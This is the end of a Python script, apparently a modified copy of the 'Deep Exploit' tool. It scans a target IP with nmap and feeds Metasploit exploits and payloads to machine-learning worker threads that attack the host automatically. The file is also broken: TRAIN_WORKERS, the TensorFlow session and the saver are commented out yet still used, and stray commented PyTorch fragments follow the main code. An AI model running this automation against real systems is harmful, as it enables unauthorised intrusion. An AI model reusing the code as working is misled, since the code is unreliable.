MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNI??>;;::~~~~~_(WH@gggmmqkkkkkbbbbbbpbbbbbkbkkqqqmg@@MH;~~~~~~~:;;>??udMMMMMBz<(+wwZOOOOOOZXwx<+dMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNv??>;:::~~~~(XMMMMMMMMMMMMNNNNNNNNNNNNNMMMMMMMMMMMMMMD<~~~~~:;;>??udMMMMNI<(xZOzz<><<;?+11zwXz<dMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNz=?>;;:~~~~~<TYYTTTC717WM@@@@@@@@@@@@@@@MBY1177TTYYY<~~~~::;>>??udMMMM#3<+tI=<<;;;:;;:;;>?1zOI>+dMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#==?>;;::~~~~~~~~~~~~~~~<7TWHHH@@@@HHW9=~~~~~~~~~~~~~~~~::;>>??udMMMM#3;+lz<<;;<:;;<::;;;:;+ztz?=dMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNe???>;:::~~~~~~~~~~~~~~~~.~~<<<<<~_.~~~~~~~~~~~~~~~~:::;>>??dMMMMMM$><zz<;;;::;<:::::::;;<+zz1OMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNe???>>;:::~~~~~~~~~~~~~~~:~~~~~~~~~~~~~~~~~~~~~~~:::;;>>?ugMMMMMMP?>1z?><::;::::<::::::::<?z1wMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNsz??>>;:::~~~~~~~~~~~~~~~~~:~~:~~~~~~~~~~~~~~::::;>>??dMMMMMMMMP>>=?<;;;:::::~::::::~::<?<jwMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNsz??>>;;:::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~:::;;>???ugMMMMMMMM#3>?=?>;<::::~:::::~::~:<><+zqMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNsz??>>>;;:::~~~~~~~~~~~~~~~~~~~~~:~::::;;>>???jgMMMMMMMMMMD>??=?<;:;::::::~~:::~~(<>+zqMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmsz???>>>;;;:::::::~::~:~::::::::;;;;>>???zqgMMMMMMMMMMMMb????>;;<::::~~::~~~~~_(<+wWMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmx?????>>>>;;;;;:;:;:;:;;;;>>>>>>???zzqMMMMMMMMMMMMMMMN2???>;::::~::~~~~~~~_:<jwWMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNK+zz?????>>>>?>>>>>>>>>??????1zzdMMMMMMMMMMMMMMMMMMMP??>>;;:~:~~~~~~~~_:<+wXWMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM=77777+vwOz=???????????????????=zzwuI?77777MMMMMMMMMMMMMMRz=+;;;:~~~~~~~:(<+xwXWMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM@<<!. -_~__::<zzuvrOz===???=?==?====?=zOwuuuZ<::~~~..._?7MMMMMMMMM$1=<::::::~::((+wXWNMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMB7?! ...~.~~~~~::::;+Ozzvrttl==???????>??=ztrvzuuVI;::::~~~~....._?<TMMM$?<<:<><<+++swXWWMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM=!`......~~~~~~~~::::::;+zwvrrtl====>>>>>+===ltrzuXVz;:::::~~~~~~~.......?d$<<:+>+zwXWQQMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM$``.......~~.~~~~~~~~~~::::;;<1OOtll===z;:;+===lltOOI1<;;:::~~:~~~~~~~~~....._(<:<>+wWNMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM9``.........~~.~~~~~~~~:~::::::;;;;>+111==z;;;?===lz1???>>;:::~:~~~~~~~~~~.~.~._(::;>+wWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMM#_~``.......~~~.~~~~~~~~~~:~~~~:::::::<++<;;;:::::::~~:((<<<<;;:~:~:~~~~~~~~.~~~._+;:;<+Z!_<jMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMM8` .......~~.~~~~.~~.~~~~~~~~~:~~~~:~:<zOrwz::::::::~:+zrrO__(>::~~~~~~~~~~~~.~.~_<>;;+zZ<..._?MMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMM8_`.._.....~~~.~~~~~~~~~~~~~~~~~~~~~~~~~?OZI<:~~:~~~~:~<zOC<_-(;:~~~~~~~~~~~~.~~~_+<:<+zO>..~~_.?MMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMM8~..`-~....~..~~..~.~~.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.-(;:~~~~~~~~~~.~~.~_<<;+?zr>_..___..?MMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMN_.... ~_...~~.~.~~.~..~...~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~... (;~~~~~.~..~..~.._<>;>?zw>_.~~~~..~.dMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMN:..... ~_....~.~..~..~.~.~............~.~~.~~~~~~~~~~~~~~~..... (<~......~...~.._+<;+?zw>_..._~_..~~.dMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMM@!......__~......~.........~...~..~......._(+z+_..........~(++-- _<~....~......._+<;+?zw>_...._~...~~.?MMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMM{ .~...._:_....~....~..~..................(OOlt<..........(zOlO<`_<~..........._+<;+?zw>_...._:_....~~_dMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMY!.~....` ~_..............................._?17<_.........._?17<_ _<~.........._+<;+?zw>_....._<_`....~.?MMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMM} ........_<_.................................................`.` _<~........._+<;<?1wv_....._:~.`.....~_dMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMM}_~......`_~_................................................`.`` _<~........_+>;>?1wC_..``.._:_`......~_dMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMY!~.......`.(<_.......................````.``...`````.`..`.``.. `` _<..`.`.`._+>>>+zOC_.``.`.._<_``.....~~.dMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMM) .........`_(<_.```````.``.``.``.`.``.`.```-jOO+_.``.``.``..(zOx_`_<..``.``_+?>;?=zI``.``.`._:~````.....~_dMMMMMMMMMMMMMMMMMMMM
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    """
    util.print_message(NONE, banner)
    show_credit(util)
    time.sleep(delay_time)


# Show credit.
def show_credit(util):
    credit = u"""
       =[ Deep Exploit v0.0.2-beta                                            ]=
+ -- --=[ Author  : Isao Takaesu (@bbr_bbq)                                   ]=--
+ -- --=[ Website : https://github.com/13o-bbr-bbq/machine_learning_security/ ]=--
    """
    util.print_message(NONE, credit)


# Check IP address format.
def is_valid_ip(rhost):
    try:
        ipaddress.ip_address(rhost)
        return True
    except ValueError:
        return False


# Define command option.
__doc__ = """{f}
Usage:
    {f} (-t <ip_addr> | --target <ip_addr>) (-m <mode> | --mode <mode>)
    {f} (-t <ip_addr> | --target <ip_addr>) [(-p <port> | --port <port>)] [(-s <product> | --service <product>)]
    {f} -h | --help

Options:
    -t --target   Require  : IP address of target server.
    -m --mode     Require  : Execution mode "train/test".
    -p --port     Optional : Indicate port number of target server.
    -s --service  Optional : Indicate product name of target server.
    -h --help     Optional : Show this screen and exit.
""".format(f=__file__)


# Parse command arguments.
def command_parse():
    args = docopt(__doc__)
    ip_addr = args['<ip_addr>']
    mode = args['<mode>']
    port = args['<port>']
    service = args['<product>']
    return ip_addr, mode, port, service


# Check parameter values.
def check_port_value(port=None, service=None):
    if port is not None:
        if port.isdigit() is False:
            Utilty().print_message(OK, 'Invalid port number: {}'.format(port))
            return False
        elif (int(port) < 1) or (int(port) > 65535):
            Utilty().print_message(OK, 'Invalid port number: {}'.format(port))
            return False
        elif port not in com_port_list:
            Utilty().print_message(OK, 'Not open port number: {}'.format(port))
            return False
        elif service is None:
            Utilty().print_message(OK, 'Invalid service name: {}'.format(str(service)))
            return False
        elif type(service) == 'int':
            Utilty().print_message(OK, 'Invalid service name: {}'.format(str(service)))
            return False
        else:
            return True
    else:
        return False


# Common list of all threads.
com_port_list = []
com_exploit_list = []
com_payload_list = []
com_indicate_flag = False


if __name__ == '__main__':
    util = Utilty()

    # Get command arguments.
    rhost, mode, port, service = command_parse()
    if is_valid_ip(rhost) is False:
        util.print_message(FAIL, 'Invalid IP address: {}'.format(rhost))
        exit(1)
    if mode not in ['train', 'test']:
        util.print_message(FAIL, 'Invalid mode: {}'.format(mode))
        exit(1)

    # Show initial banner.
    show_banner(util, 0.1)

    # Initialization of Metasploit.
    env = Metasploit(rhost)
    if rhost in env.prohibited_list:
        util.print_message(FAIL, 'Target IP={} is prohibited.\n'
                                 '    Please check "config.ini"'.format(rhost))
        exit(1)
    nmap_result = 'nmap_result_' + env.rhost + '.xml'
    nmap_command = env.nmap_command + ' ' + nmap_result + ' ' + env.rhost + '\n'
    env.execute_nmap(env.rhost, nmap_command, env.nmap_timeout)
    com_port_list, proto_list, info_list = env.get_port_list(nmap_result, env.rhost)
    com_exploit_list = env.get_exploit_list()
    com_payload_list = env.get_payload_list()
    com_payload_list.append('no payload')

    # Create exploit tree.
    exploit_tree = env.get_exploit_tree()

    # Create target host information.
    com_indicate_flag = check_port_value(port, service)
    if com_indicate_flag:
        target_tree, com_port_list = env.get_target_info_indicate(rhost, proto_list, info_list, port, service)
    else:
        target_tree = env.get_target_info(rhost, proto_list, info_list)

    # Initialization of global option.
   # TRAIN_WORKERS = env.train_worker_num
  #  TEST_WORKER = env.test_worker_num
    MAX_STEPS = env.train_max_steps
    MAX_TRAIN_NUM = env.train_max_num
    Tmax = env.train_tmax

    env.client.termination(env.client.console_id)  # Disconnect common MSFconsole.
    NUM_ACTIONS = len(com_payload_list)  # Set action number.
    NONE_STATE = np.zeros(NUM_STATES)  # Initialize state (s).

    # Define global variable, start TensorFlow session.
    frames = 0                # All trial number of all threads.
    isFinish = False          # Finishing learning/testing flag.
    post_exploit_count = 0    # Number of successful post-exploitation.
    exploit_count = 0         # Number of successful exploitation.
    plot_count = [0]          # Exploitation count list for plot.
    plot_pcount = [0]         # Post-exploit count list for plot.
  #  SESS = tf.Session()       # Start TensorFlow session.

    
    # Define saver.
  #  saver = tf.train.Saver()

    # Execute TensorFlow with multi-thread.
 #   COORD = tf.train.Coordinator()  # Prepare of TensorFlow with multi-thread.
   # SESS.run(tf.global_variables_initializer())  # Initialize variable.
   
    threads = []

    if mode == 'train':
	    # Create learning thread.
        for idx in range(TRAIN_WORKERS):
            thread_name = 'local_thread' + str(idx + 1)
            threads.append(Worker_thread(thread_name=thread_name,
				             thread_type="learning",
				             rhost=rhost))
    else:
	    # Create testing thread.
        for idx in range(TEST_WORKER):
            thread_name = 'local_thread1'
            threads.append(Worker_thread(thread_name=thread_name,
				             thread_type="test",
				             rhost=rhost))

  #  running_threads = []
    if mode == 'train':
        # Load past learned data.
        if os.path.exists(env.save_file) is True:
            # Restore learned model from local file.
            util.print_message(OK, 'Restore learned data.')
            saver.restore(SESS, env.save_file)

        # Execute learning.
        for worker in threads:
            job = lambda: worker.run(exploit_tree, target_tree, env.save_file)
            t = threading.Thread(target=job)
            t.start()
       
    else:
        # Execute testing.
        # Restore learned model from local file.
        util.print_message(OK, 'Restore learned data.')
        saver.restore(SESS, env.save_file)
        for worker in threads:
            job = lambda: worker.run(exploit_tree, target_tree)
            t = threading.Thread(target=job)
            t.start()
            
            
            
            
            
            
            
            
            
            
            
            

    
    
    
    
    
    
    


    
    
    

        
        
        
        
        
        
        
        
        
        
        
        
        









#torch.cuda.is_available()

#torch.set_default_tensor_type('torch.cuda.FloatTensor')
#print(torch.__version__)
#device = 'cuda' if torch.cuda.is_available() else 'cpu'
#print(device)
#env = BashEnv()
#for i in range(470):
#env = BashEnv()
    #env = BashEnv()
#try:
  #  agent = joblib.load('trained_agentX.pkl')
#except:
    
    
#agent = NeuralAgent()


#model=NeuralAgent()
#starttime = time.time()
#play(agent, env, -5, max_step=300, nb_episodes=1000, verbose=True).to(device)
#torch.save(agent.state_dict(), '/home/yoneda/metasploitenv/model3.pkl')
